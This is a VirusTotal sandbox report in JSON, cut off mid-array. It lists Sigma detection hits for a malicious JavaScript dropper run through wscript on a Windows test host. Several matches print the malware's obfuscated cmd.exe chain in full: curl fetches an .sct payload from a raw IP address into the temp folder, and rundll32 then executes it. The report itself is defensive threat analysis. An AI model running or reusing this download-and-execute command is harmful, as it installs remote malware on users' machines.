{
    "data":  {
                 "id":  "79b1ac4dc5cae6d03548c2ab570e98f9cfb7e4da24480ce3d513b1abdd13bf21",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/79b1ac4dc5cae6d03548c2ab570e98f9cfb7e4da24480ce3d513b1abdd13bf21"
                           },
                 "attributes":  {
                                    "downloadable":  true,
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA0-653B-2906-000000004A00}; ProcessId=7780; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-62E2-6536-6B00-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=4936; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\Praesentiumx.js\"; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1698426528; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2020feadc9b3cf47558c219948361d9d3eb5347af91135f21bf711f6032bc817",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WScript or CScript Dropper",
                                                                       "rule_description":  "Detects wscript/cscript executions of scripts located in user directories",
                                                                       "rule_author":  "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=\\??\\C:\\Windows\\system32\\conhost.exe; Image=\\??\\C:\\Windows\\system32\\conhost.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "25fc56c1bee673d7ff3edcf371e4d2a36c0af83222da348961b87735c8efa61f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "System File Execution Location Anomaly",
                                                                       "rule_description":  "Detects a Windows program executable started from a suspicious folder",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; Image=C:\\Windows\\System32\\rundll32.exe; CommandLine=C:\\Windows\\System32\\rundll32.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "53f67594c85a67cef198b525b556658fa4e46d1e49901472adbc8b7f0ba475a8",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Bad Opsec Defaults Sacrificial Processes With Improper Arguments",
                                                                       "rule_description":  "Detects attackers using tooling with bad opsec defaults.\nE.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run.\nOne trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.\n",
                                                                       "rule_author":  "Oleg Kolesnikov @securonix invrep_de, oscd.community, Florian Roth (Nextron Systems), Christian Burkard (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA2-653B-2A06-000000004A00}; ProcessId=7876; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-EEA0-653B-2906-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7780; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %%tmP%%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %%tmP%%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\Praesentiumx.js\"; UtcTime=1698426530; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %tmP%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %tmP%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; Image=C:\\Windows\\System32\\cmd.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "78dc71a5599dc85b3d37a6ab0f014aa5110b2ce1b2346c8f2730e0c481977781",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Curl Download And Execute Combination",
                                                                       "rule_description":  "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.",
                                                                       "rule_author":  "Sreeman, Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=C:\\Windows\\System32\\rundll32.exe; Image=C:\\Windows\\System32\\rundll32.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "87574dead19ceb246e10ccb4cb4fd5009c71c46de0d77965d2170bfafc2c3b14",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Rundll32 Execution Without CommandLine Parameters",
                                                                       "rule_description":  "Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=7780; DestinationPortName=http; Protocol=tcp; DestinationIp=209.197.3.8; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WScript.exe; ProcessGuid={C784477D-EEA0-653B-2906-000000004A00}; DestinationHostname=vip0x008.map2.ssl.hwcdn.net; UtcTime=1698063435; User=DESKTOP-B0T93D6\\george; DestinationPort=80; RuleName=-; SourcePort=49710; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.9; DestinationIsIpv6=false}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "8d980d509aaf7ca8f2c6cd9dd23e8ea6eb18328ca64711cb6e059ecec024fe0a",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Script Initiated Connection to Non-Local Network",
                                                                       "rule_description":  "Detects a script interpreter wscript/cscript opening a network connection to a non-local network. Adversaries may use script to download malicious payloads.",
                                                                       "rule_author":  "frack113, Florian Roth"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA5-653B-2E06-000000004A00}; ProcessId=8028; Product=The curl executable; Description=The curl executable; Company=curl, https://curl.haxx.se/; ParentProcessGuid={C784477D-EEA2-653B-2A06-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92; OriginalFileName=curl.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=7.55.1; ParentProcessId=7876; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=CUrl  http://208.167.242.194/Ona65mv/Foref -o C:\\Users\\george\\AppData\\Local\\Temp\\qYqz.sct ; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\curl.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %tmP%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %tmP%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; UtcTime=1698426533; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "d86dfee683d0e96803dc8a153d15f7208afc774045e2d885ccaec10bdcef7831",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Curl.EXE Download",
                                                                       "rule_description":  "Detects a suspicious curl process start on Windows and outputs the requested document to a local file",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA9-653B-3006-000000004A00}; ProcessId=8100; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-EEA2-653B-2A06-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=rUnDLL32  C:\\Users\\george\\AppData\\Local\\Temp\\qYqz.sct, Crash ; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %tmP%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %tmP%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; UtcTime=1698426537; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e7856bac967038b016efab8e4f315a2f16ccd6ba62f20d73df0ad3826fe654a3",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Rundll32 Execution Without DLL File",
                                                                       "rule_description":  "Detects the execution of rundll32 with a command line that doesn\u0027t contain a .dll file",
                                                                       "rule_author":  "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou (fix + fp)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA2-653B-2A06-000000004A00}; ProcessId=7876; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-EEA0-653B-2906-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7780; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %%tmP%%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %%tmP%%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\Praesentiumx.js\"; UtcTime=1698426530; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "1a5f4db4505797dbb968725fb6bf6b357968abf23fbcc6b92acd08a6214e3e4e",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Cscript/Wscript Suspicious Child Process",
                                                                       "rule_description":  "Detects suspicious child processes of Wscript/Cscript",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA9-653B-3006-000000004A00}; ProcessId=8100; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows host process (Rundll32); Company=Microsoft Corporation; ParentProcessGuid={C784477D-EEA2-653B-2A06-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; OriginalFileName=RUNDLL32.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=rUnDLL32  C:\\Users\\george\\AppData\\Local\\Temp\\qYqz.sct, Crash ; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\rundll32.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %tmP%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %tmP%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; UtcTime=1698426537; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=C:\\Windows\\System32\\rundll32.exe; Image=C:\\Windows\\System32\\rundll32.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "2fd6d2b16365ba7157eee4934b406ac7d530b4ec62cc1b45c69ee4f07989f139",
                                                                       "rule_source":  "SOC Prime Threat Detection Marketplace",
                                                                       "rule_title":  "LOLBAS rundll32 without expected arguments (via cmdline)",
                                                                       "rule_description":  "Detects use of rundll32 as a LOLBAS binary where rundll32 is passed unexpected arguments such as a .iso instead of .dll (i.e. rundll32.exe test.iso, evilexport).",
                                                                       "rule_author":  "SOC Prime Team"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; Image=rUnDLL32; CommandLine=rUnDLL32  C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\qYqz.sct, Crash}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "3c0434c2b9b483a1c7879404c2a80556dc54436bf222a970ca7131b1f30079f1",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Use Short Name Path in Command Line",
                                                                       "rule_description":  "Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection",
                                                                       "rule_author":  "frack113, Nasreddine Bencherchali"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA0-653B-2906-000000004A00}; ProcessId=7780; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Windows Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-62E2-6536-6B00-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; OriginalFileName=wscript.exe; ParentImage=C:\\Windows\\explorer.exe; FileVersion=5.812.10240.16384; ParentProcessId=4936; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\Praesentiumx.js\"; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\wscript.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\Explorer.EXE; UtcTime=1698426528; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b884f70bb47a8e06faf8f548fcfef77fe3802d22c310c4cdfa01f35cb030bac",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript",
                                                                       "rule_description":  "Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript",
                                                                       "rule_author":  "Michael Haag"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=7780; DestinationPortName=http; Protocol=tcp; DestinationIp=209.197.3.8; Initiated=true; SourcePortName=-; Image=C:\\Windows\\System32\\WScript.exe; ProcessGuid={C784477D-EEA0-653B-2906-000000004A00}; DestinationHostname=vip0x008.map2.ssl.hwcdn.net; UtcTime=1698063435; User=DESKTOP-B0T93D6\\george; DestinationPort=80; RuleName=-; SourcePort=49710; SourceIsIpv6=false; SourceHostname=DESKTOP-B0T93D6.local; SourceIp=192.168.2.9; DestinationIsIpv6=false}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "d2ba63dcfd40541d69308865939969a6282a95c29b46e0eaeb0c39701b6aa2f7",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Script Initiated Connection",
                                                                       "rule_description":  "Detects a script interpreter wscript/cscript opening a network connection. Adversaries may use script to download malicious payloads.",
                                                                       "rule_author":  "frack113"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=1; CommandLine=C:\\Windows\\System32\\rundll32.exe; Image=C:\\Windows\\System32\\rundll32.exe}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "e7856bac967038b016efab8e4f315a2f16ccd6ba62f20d73df0ad3826fe654a3",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Rundll32 Execution With Uncommon DLL Extension",
                                                                       "rule_description":  "Detects the execution of rundll32 with a command line that doesn\u0027t contain a common extension",
                                                                       "rule_author":  "Tim Shelton, Florian Roth (Nextron Systems), Yassine Oukessou"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA5-653B-2E06-000000004A00}; ProcessId=8028; Product=The curl executable; Description=The curl executable; Company=curl, https://curl.haxx.se/; ParentProcessGuid={C784477D-EEA2-653B-2A06-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92; OriginalFileName=curl.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=7.55.1; ParentProcessId=7876; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=CUrl  http://208.167.242.194/Ona65mv/Foref -o C:\\Users\\george\\AppData\\Local\\Temp\\qYqz.sct ; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\curl.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %tmP%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %tmP%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; UtcTime=1698426533; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "eb80a13f018daf47775fec9d5aaf6173f1ad3ed6a71702583f0bbb2feabc66f4",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "File Download From IP URL Via Curl.EXE",
                                                                       "rule_description":  "Detects file downloads directly from IP address URL using curl.exe",
                                                                       "rule_author":  "Nasreddine Bencherchali (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-EEA2-653B-2A06-000000004A00}; ProcessId=7876; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-EEA0-653B-2906-000000004A00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\wscript.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7780; CurrentDirectory=C:\\Windows\\system32\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c qYqz || echo qYqz \u0026 pINg qYqz || CUrl http://208.167.242.194/Ona65mv/Foref -o %%tmP%%\\qYqz.sct \u0026 pINg -n 2 qYqz || rUnDLL32 %%tmP%%\\qYqz.sct, Crash \u0026 exIT mSQlNPilxT; EventID=1; LogonGuid=C784477D-62E2-6536-22D7-030000000000; LogonId=251682; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\System32\\WScript.exe \"C:\\Users\\george\\Desktop\\Praesentiumx.js\"; UtcTime=1698426530; RuleName=-}"
                                                                                             },
